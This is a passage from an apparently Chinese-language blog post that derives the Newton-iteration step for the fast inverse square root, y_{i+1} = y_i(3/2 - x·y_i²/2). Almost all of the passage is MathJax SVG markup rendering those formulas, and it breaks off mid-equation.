<p>然后我们求<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>的平方根倒数就可以用这个<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.182ex;" xmlns="http://www.w3.org/2000/svg" width="13.668ex" height="3.139ex" role="img" focusable="false" viewBox="0 -864.9 6041.2 1387.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1429,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2095.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3151.6,0)"><g data-mml-node="mn" transform="translate(370.8,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msup" transform="translate(220,-377.4) scale(0.707)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><rect width="855.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4468.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(5469.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>。然后代入牛顿法的迭代公式，能够得到如下结果：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.827ex;" xmlns="http://www.w3.org/2000/svg" width="59.717ex" height="6.785ex" role="img" focusable="false" viewBox="0 -1749.5 26395.1 2999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(880.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1269.5,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1759.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2426.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3482,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(4260,0)"><g data-mml-node="mn" transform="translate(433.3,676)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(220,-719.2)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,289) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><rect width="1126.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mstyle" transform="translate(5626.6,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mo" transform="translate(6904.3,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="mstyle" transform="translate(7904.3,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="msub" transform="translate(9182.1,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(11180.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(12236.3,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(13219.9,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M758 -1237T758 -1240T752 -1249H736Q718 -1249 717 -1248Q711 -1245 672 -1199Q237 -706 237 251T672 1700Q697 1730 716 1749Q718 1750 735 1750H752Q758 1744 758 1741Q758 1737 740 1713T689 1644T619 1537T540 1380T463 1176Q348 802 348 251Q348 -242 441 -599T744 -1218Q758 -1237 758 -1240Z"></path></g><g data-mml-node="mfrac" transform="translate(792,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1954.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(2954.4,0)"><g data-mml-node="mi" transform="translate(647.3,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mrow" transform="translate(220,-784.5)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msubsup" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,353.6) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(523,-293.8) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><rect width="1626.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4821,0) translate(0 -0.5)"><path data-c="29" d="M33 1741Q33 1750 51 1750H60H65Q73 1750 81 1743T119 1700Q554 1207 554 251Q554 -707 119 -1199Q76 -1250 66 -1250Q65 -1250 62 -1250T56 -1249Q55 -1249 53 -1249T49 -1250Q33 -1250 33 -1239Q33 -1236 50 -1214T98 -1150T163 -1052T238 -910T311 -727Q443 -335 443 251Q443 402 436 532T405 831T339 1142T224 1438T50 1716Q33 1737 33 1741Z"></path></g></g><g data-mml-node="mo" transform="translate(19110.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(20166.5,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(21150.1,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M758 -1237T758 -1240T752 -1249H736Q718 -1249 717 -1248Q711 -1245 672 -1199Q237 -706 237 251T672 1700Q697 1730 716 1749Q718 1750 735 1750H752Q758 1744 758 1741Q758 1737 740 1713T689 1644T619 1537T540 1380T463 1176Q348 802 348 251Q348 -242 441 -599T744 -1218Q758 -1237 758 -1240Z"></path></g><g data-mml-node="mfrac" transform="translate(792,0)"><g data-mml-node="mrow" transform="translate(220,752.2)"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1722.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="msubsup" transform="translate(2294.4,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 